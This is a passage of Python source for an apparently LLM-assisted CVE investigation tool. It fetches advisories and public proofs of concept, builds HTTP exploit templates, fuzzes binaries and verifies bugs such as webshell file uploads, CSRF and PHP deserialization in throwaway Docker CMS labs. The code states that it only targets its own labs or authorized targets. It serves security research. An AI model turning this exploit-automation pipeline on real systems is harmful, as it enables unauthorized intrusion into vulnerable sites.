                     "own Dockerfile/compose..."))
                wr = verify_generic_open_redirect(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, redirect_param_hint=redir_p or "", on_step=step, budget_s=budget_s)
                def _attempt_or_generic(ep, pr):
                    return verify_generic_open_redirect(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        redirect_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_or_generic, wr, notes.get("endpoint"), redir_p,
                    technique_label="open redirect generico")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "file-upload" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_file_upload, _pick_param
                from .wpverify import _FILE_UPLOAD_HINTS
                params = notes.get("parameters") or []
                file_p = notes.get("file_param") or _pick_param(params, _FILE_UPLOAD_HINTS)
                step(("intentando verificacion DINAMICA -- webshell subido que calcula una suma "
                     "(Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- uploaded webshell computing a sum "
                     "(ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_file_upload(fr.local_path, plugin_dir, notes.get("endpoint"),
                                               notes.get("http_method") or "POST", params,
                                               file_param_hint=file_p or "", on_step=step, budget_s=budget_s)
                def _attempt_file_upload_drupal(ep, pr):
                    return verify_drupal_file_upload(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "POST", params,
                        file_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_MUESTRA_EVIDENCE_KEYS,
                    _attempt_file_upload_drupal, wr, notes.get("endpoint"), file_p,
                    technique_label="file upload Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "file-upload" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_file_upload, _pick_param, _FILE_UPLOAD_HINTS
                params = notes.get("parameters") or []
                file_p = notes.get("file_param") or _pick_param(params, _FILE_UPLOAD_HINTS)
                step(("intentando verificacion DINAMICA -- webshell subido que calcula una suma "
                     "(WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- uploaded webshell computing a sum "
                     "(ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_file_upload(fr.local_path, plugin_dir, notes.get("endpoint"),
                                                  notes.get("http_method") or "POST", params,
                                                  file_param_hint=file_p or "", on_step=step, budget_s=budget_s,
                                                  companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                                                  keep_lab_on_failure=keep_lab_on_failure)
                fu_wp_extra_nonce_pages: List[str] = []
                fu_wp_extra_setup_trigger_paths: List[str] = []
                def _on_fu_wp_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, fu_wp_extra_nonce_pages,
                                                 fu_wp_extra_setup_trigger_paths, params)
                def _attempt_file_upload_wp(ep, pr):
                    return verify_wordpress_file_upload(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "POST", params,
                        file_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(fu_wp_extra_nonce_pages),
                        extra_setup_trigger_paths=list(fu_wp_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_file_upload_wp, wr, notes.get("endpoint"), file_p,
                        technique_label="file upload WordPress", on_suggestion=_on_fu_wp_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
            # "cualquier entorno": fallback generico de file-upload (ver genericverify.py) para
            # cuando el codigo descargado no es un CMS reconocido pero trae su propio Dockerfile/
            # docker-compose.yml -- confirma el ALMACENAMIENTO real (grep dentro del contenedor),
            # nunca la ejecucion (eso exigiria conocer la URL publica real, especifica del stack).
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class == "file-upload" and notes.get("endpoint")):
                from .genericverify import verify_generic_file_upload, _pick_param
                from .wpverify import _FILE_UPLOAD_HINTS
                params = notes.get("parameters") or []
                file_p = notes.get("file_param") or _pick_param(params, _FILE_UPLOAD_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- fichero subido con un "
                     "secreto real, confirmado dentro del contenedor (grep), el objetivo se "
                     "construye desde su propio Dockerfile/compose..." if es else
                     "attempting GENERIC DYNAMIC verification -- uploaded file with a real "
                     "secret, confirmed inside the container (grep), the target is built from "
                     "its own Dockerfile/compose..."))
                wr = verify_generic_file_upload(
                    fr.local_path, notes.get("endpoint"), file_param_hint=file_p or "",
                    other_parameters=params, on_step=step, budget_s=budget_s)
                _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "csrf" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_csrf, _pick_param
                from .wpverify import _EMAIL_HINTS, _PASS_HINTS
                params = notes.get("parameters") or []
                email_p = notes.get("email_param") or _pick_param(params, _EMAIL_HINTS)
                pass_p = notes.get("pass_param") or _pick_param(params, _PASS_HINTS)
                step(("intentando verificacion DINAMICA -- self-CSRF sin token, origen externo "
                     "ficticio (Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- self-CSRF without a token, fake external "
                     "origin (ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_csrf(fr.local_path, plugin_dir, notes.get("endpoint"),
                                        notes.get("http_method") or "POST", params,
                                        email_param_hint=email_p or "",
                                        pass_param_hint=pass_p or "", on_step=step, budget_s=budget_s)
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "csrf" and notes.get("endpoint")):
                from .wpverify import (verify_wordpress_csrf, _pick_param, _EMAIL_HINTS,
                                       _PASS_HINTS)
                params = notes.get("parameters") or []
                email_p = notes.get("email_param") or _pick_param(params, _EMAIL_HINTS)
                pass_p = notes.get("pass_param") or _pick_param(params, _PASS_HINTS)
                step(("intentando verificacion DINAMICA -- self-CSRF sin nonce, origen externo "
                     "ficticio (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- self-CSRF without a nonce, fake external "
                     "origin (ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_csrf(fr.local_path, plugin_dir, notes.get("endpoint"),
                                           notes.get("http_method") or "POST", params,
                                           email_param_hint=email_p or "",
                                           pass_param_hint=pass_p or "", on_step=step, budget_s=budget_s,
                                           companion_plugins=companion_plugins, keep_lab_on_failure=keep_lab_on_failure)
                _apply_wpverify_result(inv, wr, es, llm)
            # deserializacion insegura (PHP Object Injection) -- ver deserialize_gadgets.py: a
            # diferencia de las demas clases, el gadget se busca PRIMERO en el codigo real (sin
            # eso no hay nada que verificar, no se inventa una cadena de terceros), y solo si se
            # encuentra se levanta el laboratorio. Tercera clase comun a los tres CMS que llega
            # a este punto ("poco a poco").
            elif (is_joomla and fr.kind in ("local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "deserialization" and notes.get("endpoint")):
                from .joomlaverify import verify_joomla_deserialization, _pick_param
                from .wpverify import _SERIAL_HINTS
                params = notes.get("parameters") or []
                serial_p = notes.get("serial_param") or _pick_param(params, _SERIAL_HINTS)
                step(("intentando verificacion DINAMICA -- gadget de deserializacion del propio "
                     "codigo (Joomla+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- deserialization gadget from the "
                     "extension's own code (ephemeral Joomla+MySQL in Docker)..."))
                wr = verify_joomla_deserialization(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "POST", params,
                    serial_param_hint=serial_p or "", on_step=step, budget_s=budget_s)
                _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "deserialization" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_deserialization, _pick_param
                from .wpverify import _SERIAL_HINTS
                params = notes.get("parameters") or []
                serial_p = notes.get("serial_param") or _pick_param(params, _SERIAL_HINTS)
                step(("intentando verificacion DINAMICA -- gadget de deserializacion del propio "
                     "codigo (Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- deserialization gadget from the "
                     "module's own code (ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_deserialization(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "POST", params,
                    serial_param_hint=serial_p or "", on_step=step, budget_s=budget_s)
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "deserialization" and notes.get("endpoint")
                  and notes.get("table_name") and notes.get("column_name")):
                # variante EN DOS PASOS (tabla propia del plugin, el mecanismo REAL de object
                # injection almacenado en WordPress -- la API de Options/Transients esta cerrada
                # desde WP 3.6.1 por maybe_serialize(), ver verify_wordpress_deserialization_stored
                # en el historial de commits). Solo se usa cuando el analista (via --params/hints)
                # ya sabe la tabla/columna reales: no hay deteccion estatica automatica de
                # $wpdb->insert()/update() todavia.
                from .wpverify import verify_wordpress_deserialization_custom_table, _pick_param, _SERIAL_HINTS
                params = notes.get("parameters") or []
                serial_p = notes.get("serial_param") or _pick_param(params, _SERIAL_HINTS)
                step(("intentando verificacion DINAMICA -- gadget de deserializacion en DOS PASOS "
                     "via tabla propia del plugin (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- TWO-STEP deserialization gadget via the "
                     "plugin's own table (ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_deserialization_custom_table(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "POST", params,
                    table_name=notes.get("table_name"), column_name=notes.get("column_name"),
                    id_column=notes.get("id_column") or "id",
                    serial_param_hint=serial_p or "", on_step=step, budget_s=budget_s,
                    companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                    keep_lab_on_failure=keep_lab_on_failure)
                # mismo bucle de aprendizaje-y-reintento que el resto -- aqui el PASO 1 es el que
                # puede bloquearse por nonce/setup sin resolver (el PASO 2 lee directo via wp-cli,
                # no pasa por HTTP, asi que no tiene ese bloqueo).
                dct_extra_nonce_pages: List[str] = []
                dct_extra_setup_trigger_paths: List[str] = []
                def _on_dct_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, dct_extra_nonce_pages,
                                                 dct_extra_setup_trigger_paths, params)
                def _attempt_dct(ep, pr):
                    return verify_wordpress_deserialization_custom_table(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "POST",
                        params, table_name=notes.get("table_name"),
                        column_name=notes.get("column_name"),
                        id_column=notes.get("id_column") or "id",
                        serial_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(dct_extra_nonce_pages),
                        extra_setup_trigger_paths=list(dct_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_dct, wr, notes.get("endpoint"), serial_p,
                        technique_label="deserialization (tabla propia) WordPress",
                        on_suggestion=_on_dct_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "deserialization" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_deserialization, _pick_param, _SERIAL_HINTS
                params = notes.get("parameters") or []
                serial_p = notes.get("serial_param") or _pick_param(params, _SERIAL_HINTS)
                step(("intentando verificacion DINAMICA -- gadget de deserializacion del propio "
                     "codigo (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- deserialization gadget from the "
                     "plugin's own code (ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_deserialization(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "POST", params,
                    serial_param_hint=serial_p or "", on_step=step, budget_s=budget_s,
                    companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                    keep_lab_on_failure=keep_lab_on_failure)
                des_extra_nonce_pages: List[str] = []
                des_extra_setup_trigger_paths: List[str] = []
                def _on_des_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, des_extra_nonce_pages,
                                                 des_extra_setup_trigger_paths, params)
                def _attempt_des(ep, pr):
                    return verify_wordpress_deserialization(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "POST",
                        params, serial_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(des_extra_nonce_pages),
                        extra_setup_trigger_paths=list(des_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_des, wr, notes.get("endpoint"), serial_p,
                        technique_label="deserialization WordPress",
                        on_suggestion=_on_des_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
        else:
            step(f"no se pudo obtener el codigo: {fr.note}" if es else
                 f"could not fetch the source: {fr.note}")
            if guessed_source:
                inv.blockers.append((f"el LLM no indico source_url; se probo '{source}' como "
                                     f"slug de WordPress.org (adivinado del propio texto del "
                                     f"aviso, 'This issue affects {source}:') pero no se pudo "
                                     f"descargar ({fr.note}) -- pasa --source a mano con el slug "
                                     f"real/un .zip si lo conoces" if es else
                                     f"the LLM gave no source_url; tried '{source}' as a "
                                     f"WordPress.org slug (guessed from the advisory's own "
                                     f"'This issue affects {source}:' text) but it could not be "
                                     f"downloaded ({fr.note}) -- pass --source by hand with the "
                                     f"real slug/a .zip if you know it"))
            else:
                inv.blockers.append((f"no se pudo descargar el codigo ({fr.note})" if es else
                                     f"could not download the source ({fr.note})"))
    else:
        inv.blockers.append(("el LLM no indico un source_url/slug del plugin, y no se pudo "
                             "adivinar uno del texto del aviso: sin codigo real que confirmar "
                             "(la clase/hipotesis siguen siendo validas) -- pasa --source a mano "
                             "si conoces el slug/paquete real" if es else
                             "the LLM did not provide a source_url/plugin slug, and none could "
                             "be guessed from the advisory text: no real source to confirm "
                             "against (the class/hypothesis are still valid) -- pass --source by "
                             "hand if you know the real slug/package"))

    step("desarrollando el PoC HTTP a partir de la hipotesis..." if es else
         "developing the HTTP PoC from the hypothesis...")
    poc = build_http_poc(inv.vuln_class, inv.cve_id, notes, lang=lang)
    if poc:
        inv.developed_script = poc
        inv.poc_kind = "html" if inv.vuln_class == "csrf" else "http"
    else:
        inv.blockers.append(("sin plantilla de PoC para esta clase todavia" if es else
                             "no PoC template for this class yet"))

    if not notes.get("endpoint"):
        inv.blockers.append(("falta el endpoint/ruta exacto (ajusta ENDPOINT en el PoC)" if es else
                             "missing the exact endpoint/route (set ENDPOINT in the PoC)"))
    if not inv.verified:
        inv.blockers.append(("para pasar a VERIFICADO: ejecuta el PoC contra TU objetivo autorizado "
                             "(laboratorio propio o engagement con alcance) y confirma el efecto "
                             "observado; binoracle no lanza peticiones contra objetivos por su "
                             "cuenta (salvo el laboratorio efimero de wpverify.py, cuando aplica)"
                             if es else
                             "to reach VERIFIED: run the PoC against YOUR authorized target (your "
                             "own lab or a scoped engagement) and confirm the observed effect; "
                             "binoracle does not fire requests at targets on its own (except "
                             "wpverify.py's ephemeral lab, when applicable)"))


def investigate_cve(cve_id: str, binary: str = "", config=None, llm=None,
                    on_step: Optional[Callable[[str], None]] = None, lang: str = "es",
                    budget_s: float = 300.0, hints: Optional[dict] = None,
                    use_cache: bool = True) -> Investigation:
    """Investiga una CVE con el LLM y prueba lo que se pueda. No lanza.

    `hints` deja al analista aportar lo que YA SABE de la CVE (igual que un exploit developer real:
    la hipotesis del LLM es un punto de partida, no la unica fuente) y pisa lo que proponga el LLM en
    esas claves exactas: source_url (slug de WordPress.org o URL git), affected_version, endpoint,
    http_method, parameters (lista), vulnerable_functions (lista). Util cuando ya tienes el aviso
    oficial delante y no quieres depender de que el modelo adivine el slug/endpoint correctos.

    `use_cache` (por defecto True) reusa el resultado YA GUARDADO de una investigacion anterior de
    la MISMA cve_id, si lo hay (ver load_investigation_from_cache) -- se desactiva solo cuando se
    da `binary` o `hints`, porque entonces la investigacion depende de datos que la cache no
    recoge y reusarla seria devolver un resultado de una pregunta distinta. Pasa use_cache=False a
    mano (--no-cache en la CLI) para forzar una investigacion fresca de todas formas, p.ej. tras
    arreglar un bug que SI debia cambiar el resultado."""
    import os
    from ..config import load_config
    from ..llm import make_backend
    from .cvelookup import fetch_cve
    from .cveplan import classify_cve, classify_binary, plan, is_web_class

    step = on_step or (lambda _m: None)
    es = lang == "es"
    if use_cache and not binary and not hints:
        cached = load_investigation_from_cache(cve_id)
        if cached is not None:
            step((f"{cve_id}: resultado ya en cache local, reusando (pasa --no-cache para forzar "
                 f"una investigacion nueva)") if es else
                 (f"{cve_id}: result already cached locally, reusing it (pass --no-cache to "
                 f"force a fresh investigation)"))
            return cached
    config = config or load_config()
    if llm is None:
        try:
            llm = make_backend(config)
        except Exception:
            llm = None
    inv = Investigation(cve_id=cve_id.upper().strip())

    # 1) consulta la CVE
    step(f"consultando {inv.cve_id} (NVD + GitHub + Exploit-DB)..." if es else
         f"looking up {inv.cve_id} (NVD + GitHub + Exploit-DB)...")
    info = fetch_cve(inv.cve_id)
    inv.description = info.description
    inv.lookup_ok = info.ok
    inv.lookup_note = info.note
    inv.is_gap = info.is_gap
    inv.cvss_score = info.cvss_score
    inv.cvss_severity = info.cvss_severity
    inv.cvss_vector = info.cvss_vector
    inv.published = info.published
    if info.ok:
        step((f"{inv.cve_id}: {'HUECO (sin exploit publico)' if info.is_gap else 'ya tiene exploit publico'}"
              if es else
              f"{inv.cve_id}: {'GAP (no public exploit)' if info.is_gap else 'has public exploit'}"))
    else:
        step(f"{inv.cve_id}: {info.note}")

    # 2) el LLM investiga (hipotesis)
    llm_on = bool(llm and getattr(llm, "available", lambda: False)())
    if llm_on and inv.description:
        step("el LLM analiza la vulnerabilidad y propone un plan..." if es else
             "the LLM analyzes the vulnerability and proposes a plan...")
        notes = _llm_research(llm, inv.cve_id, inv.description)
        if notes:
            inv.llm_notes = notes
            step((f"hipotesis del LLM: clase={notes.get('vuln_class','?')}, "
                  f"disparador={notes.get('trigger','?')}" if es else
                  f"LLM hypothesis: class={notes.get('vuln_class','?')}, "
                  f"trigger={notes.get('trigger','?')}"))
    elif not llm_on:
        step("sin modelo LLM disponible: via determinista (arranca ollama para el modo agente)" if es else
             "no LLM available: deterministic path (start ollama for agent mode)")

    # 2a) si ya consta un exploit publico, no te quedes solo con el booleano: descarga el PoC REAL
    # (GitHub) y pide al LLM que extraiga de EL los datos exactos -- el autor del PoC ya resolvio
    # como explotarla de verdad (endpoint/parametros/payload exactos, y cualquier precondicion que
    # documente), asi que pesa mas que la hipotesis generada solo desde el resumen de la CVE (pero
    # menos que hechos dados a mano por el analista, en 2b mas abajo).
    if llm_on and info.has_public_exploit and info.exploit_refs:
        step("el exploit publico existe: descargando y leyendo el PoC real (GitHub)..." if es else
             "public exploit exists: downloading and reading the real PoC (GitHub)...")
        poc_text = fetch_public_poc_source(info.exploit_refs, on_step=step)
        if poc_text:
            poc_hints = _extract_hints_from_real_poc(llm, poc_text)
            if poc_hints:
                poc_hints, dropped_version = _drop_unreliable_poc_version(
                    poc_hints, inv.llm_notes.get("affected_version") or "")
                if dropped_version:
                    step(f"'{dropped_version[0]}' del PoC no tiene pinta de version real (sin "
                         f"puntos); se mantiene '{dropped_version[1]}' de la hipotesis anterior"
                         if es else
                         f"'{dropped_version[0]}' from the PoC doesn't look like a real version "
                         f"(no dots); keeping '{dropped_version[1]}' from the earlier hypothesis")
                github_ref = next((r for r in info.exploit_refs if r.source == "github"), None)
                poc_hints, dropped_source = _drop_poc_self_referencing_source_url(
                    poc_hints, github_ref.url if github_ref else "")
                if dropped_source:
                    step(f"el PoC dio su propio repo ({dropped_source}) como source_url -- eso no "
                         f"es el codigo del plugin, se descarta" if es else
                         f"the PoC gave its own repo ({dropped_source}) as source_url -- that's not "
                         f"the plugin's code, dropping it")
                inv.poc_source_used = github_ref.url if github_ref else ""
                # El PoC puede reportar 'rce' como vuln_class (la consecuencia) cuando la
                # causa raiz es 'path-traversal', 'sqli', etc. -- no dejar que eso pise la
                # clase inicial del LLM: el dispatcher de _run_web_investigation necesita la
                # clase de la causa raiz para elegir el verificador correcto.
                _existing_vc = inv.llm_notes.get("vuln_class", "")
                _poc_vc = poc_hints.get("vuln_class", "")
                _CAUSE_ROOT_CLASSES = {
                    "path-traversal", "sqli", "xss", "ssrf", "ssti", "xxe",
                    "open-redirect", "file-upload", "idor", "missing-authorization",
                    "auth-bypass", "csrf", "command-injection",
                }
                if (_existing_vc in _CAUSE_ROOT_CLASSES and
                        _poc_vc not in _CAUSE_ROOT_CLASSES and _poc_vc):
                    poc_hints = {k: v for k, v in poc_hints.items() if k != "vuln_class"}
                inv.llm_notes = {**inv.llm_notes, **poc_hints}
                step((f"PoC real leido -- endpoint={poc_hints.get('endpoint', '?')}, "
                     f"parameters={poc_hints.get('parameters', '?')}" if es else
                     (f"real PoC read -- endpoint={poc_hints.get('endpoint', '?')}, "
                     f"parameters={poc_hints.get('parameters', '?')}")))
            else:
                step("PoC descargado pero no se pudo extraer nada util de el" if es else
                     "PoC downloaded but nothing useful could be extracted from it")
        else:
            step("no se pudo descargar ningun PoC publico de GitHub (o ninguno aplica)" if es else
                 "could not download any public GitHub PoC (or none applies)")

        # intenta un parseo DETERMINISTICO de un bloque de peticion HTTP cruda en el propio texto
        # del PoC -- gana sobre TODO lo anterior (hipotesis inicial y extraccion via LLM): es
        # literalmente la peticion que el autor del PoC confirmo que funciona, con los valores
        # REALES de cada parametro (no solo sus nombres, como da la extraccion via LLM).
        if poc_text:
            raw_req = parse_raw_http_poc_request(poc_text)
            if raw_req:
                inv.llm_notes["endpoint"] = raw_req["path"]
                inv.llm_notes["http_method"] = raw_req["method"]
                if raw_req["body_params"]:
                    inv.llm_notes["parameters"] = raw_req["body_params"]
                step((f"bloque de peticion HTTP cruda encontrado en el PoC -- usando "
                     f"{raw_req['method']} {raw_req['path']} con los parametros y valores REALES "
                     f"tal cual (sin pasar por el LLM, cero riesgo de alucinacion)") if es else
                     (f"raw HTTP request block found in the PoC -- using {raw_req['method']} "
                     f"{raw_req['path']} with the REAL parameters and values as-is (no LLM "
                     f"involved, zero hallucination risk)"))

    # 2b) hechos conocidos del analista: PISAN la hipotesis del LLM en esas claves (el analista
    # que tiene el aviso oficial delante sabe el slug/endpoint reales mejor que una adivinanza).
    if hints:
        given = {k: v for k, v in hints.items() if v}
        if given:
            inv.llm_notes = {**inv.llm_notes, **given}
            step(("hechos del analista aplicados: " if es else "analyst-supplied facts applied: ")
                 + ", ".join(f"{k}={v}" for k, v in given.items()))

    # 3) clasifica + desarrolla la plantilla (grounded, deterministico)
    # El LLM analizo la causa raiz especifica (p.ej. "path-traversal"); la descripcion puede
    # mencionar la CONSECUENCIA (p.ej. "remote code execution"). La hipotesis del LLM gana
    # sobre la clasificacion por keyword en la descripcion cuando el LLM fue consultado.
    _llm_class = classify_cve(inv.llm_notes.get("vuln_class", ""))
    _desc_class = classify_cve(inv.description)
    # "file-upload" es un VECTOR de entrega, no el impacto final. Si la descripcion identifica
    # un mecanismo de impacto mas especifico (ssti, path-traversal, command-injection, xxe...),
    # ese gana sobre el "file-upload" del LLM -- e.g. CVE-2026-27641: LLM dice "file-upload"
    # pero la descripcion dice "server-side template injection (SSTI)".
    # "deserialization" es igualmente vaga cuando la descripcion dice claramente ssti/traversal/etc.
    # (confirmado en vivo con CVE-2025-27516: LLM retorno "deserialization" pero la descripcion
    # dice "templating engine" -> classify_cve da "ssti" -> el lab correcto es el Jinja2 SSTI).
    _UPLOAD_OVERRIDE = {"ssti", "path-traversal", "command-injection", "xxe", "sqli", "ssrf"}
    if _llm_class in ("file-upload", "deserialization") and _desc_class in _UPLOAD_OVERRIDE:
        inv.vuln_class = _desc_class
    else:
        inv.vuln_class = _llm_class or _desc_class or ""
    has_bin = bool(binary and os.path.exists(binary))

    if is_web_class(inv.vuln_class):
        # Clase WEB/APP (missing-authorization, IDOR, SQLi, RCE...): no hay binario que explotar con
        # pwntools, el "exploit" es una peticion HTTP. En vez de forzar el camino de memoria, esto:
        #   1) intenta DESCARGAR el codigo real (plugin de WordPress.org o repo git) y confirmar por
        #      grep que las funciones citadas por el LLM existen de verdad (evidencia GROUNDED),
        #   2) desarrolla el PoC HTTP (o la pagina para CSRF) a partir de la hipotesis del LLM.
        # Nunca se marca 'verificado' aqui: eso exige lanzar el PoC contra un objetivo autorizado real.
        _run_web_investigation(inv, lang=lang, step=step, llm=(llm if llm_on else None),
                               budget_s=budget_s)
        inv.steps = []
        return inv

    if has_bin:
        # 4a) AUTO-FUZZING: descubre dinamicamente el disparador (stdin/argv/format-string)
        try:
            from .autofuzz import autofuzz, directed_fuzz
            step("auto-fuzzing: buscando el input que dispara el fallo..." if es else
                 "auto-fuzzing: searching for the crashing input...")
            fz = autofuzz(binary, on_step=lambda m: step(m), lang=lang)
            if fz.ok and fz.triggers:
                t = fz.triggers[0]
                inv.trigger = (f"{t.vector} -> {t.vuln_class}"
                               + (f" (~{t.min_size} bytes)" if t.min_size else ""))
            # si el fuzzing generico no crashea y el LLM tiene una hipotesis del disparador, prueba
            # invocaciones DIRIGIDAS por el LLM (flags/patrones especificos del trigger).
            elif llm_on and inv.llm_notes.get("trigger"):
                step("fuzzing DIRIGIDO por el LLM (segun la hipotesis del disparador)..." if es else
                     "LLM-DIRECTED fuzzing (from the trigger hypothesis)...")
                dz = directed_fuzz(binary, inv.llm_notes.get("trigger", ""), llm,
                                   on_step=lambda m: step(m), lang=lang)
                if dz.ok and dz.triggers:
                    t = dz.triggers[0]
                    inv.trigger = f"{t.vector} (dirigido por LLM) -> {t.vuln_class}"
                elif dz.note:
                    inv.blockers.append(("fuzzing dirigido: " + dz.note) if es else
                                        ("directed fuzzing: " + dz.note))
        except Exception:
            pass
        # 4b) PRUEBA de verdad: concreta offset/gadgets y VERIFICA en sandbox
        step(f"binario dado: intentando explotar y verificar en sandbox (presupuesto {budget_s:.0f}s)..."
             if es else
             f"binary provided: attempting exploit + sandbox verification (budget {budget_s:.0f}s)...")
        from .exploit_trainer import plan_with_budget
        hint = classify_binary(binary) or inv.vuln_class or ""
        _poc_ref = next((r.url for r in info.exploit_refs), "") if info.exploit_refs else ""
        pl, err = plan_with_budget(binary, hint, lang, True, budget_s,
                                   has_public_exploit=info.has_public_exploit, poc_ref_url=_poc_ref)
        if pl is None:
            inv.blockers.append(("verificacion agoto el presupuesto" if err == "timeout" else f"error: {err}")
                                if es else ("verification exceeded budget" if err == "timeout" else f"error: {err}"))
        else:
            inv.vuln_class = pl.vuln_class or inv.vuln_class
            inv.developed_script = pl.script
            inv.verified = bool(pl.verified)
            if pl.verified:
                pr = pl.proof or {}
                inv.verified_detail = "  ".join(f"{k}={v}" for k, v in pr.items() if k != "output" and v)
                step("EXPLOIT VERIFICADO en sandbox: objetivo alcanzado." if es else
                     "EXPLOIT VERIFIED in sandbox: goal reached.")
            else:
                step("no se pudo verificar una cadena ejecutable; queda la plantilla desarrollada." if es else
                     "could not verify an executable chain; developed template remains.")
    else:
        # sin binario: desarrolla la plantilla y deja claros los bloqueos reales
        _poc_ref = next((r.url for r in info.exploit_refs), "") if info.exploit_refs else ""
        pl = plan(inv.description or inv.cve_id, {}, cve=inv.cve_id, lang=lang,
                 has_public_exploit=info.has_public_exploit, poc_ref_url=_poc_ref)
        inv.developed_script = pl.script
        tgt = inv.llm_notes.get("target_binary") or ("el binario vulnerable concreto" if es else
                                                     "the specific vulnerable binary")
        trg = inv.llm_notes.get("trigger") or ("el disparador de la vulnerabilidad" if es else
                                               "the vulnerability trigger")
        inv.blockers.append((f"falta {tgt} (obtenlo de un paquete/imagen Docker de esa version)" if es else
                             f"missing {tgt} (obtain it from a package/Docker image of that version)"))
        inv.blockers.append((f"falta reproducir {trg} (harness/fuzzing o la peticion concreta)" if es else
                             f"missing a way to reproduce {trg} (harness/fuzzing or the exact request)"))
        step("sin binario: esquema + plantilla desarrollados; bloqueos reales anotados." if es else
             "no binary: schema + template developed; real blockers noted.")

    inv.steps = []   # el streaming ya emitio los pasos; el informe los reconstruye del render

    # Captura de terminal: estado final de la investigacion
    try:
        from .wpverify import _screenshot_terminal_step
        _status = ("VERIFICADO" if inv.verified else "NO CONFIRMADO") if es else ("VERIFIED" if inv.verified else "UNCONFIRMED")
        _detail = inv.verified_detail or inv.blockers[0] if (inv.verified_detail or inv.blockers) else ""
        _term_content = (
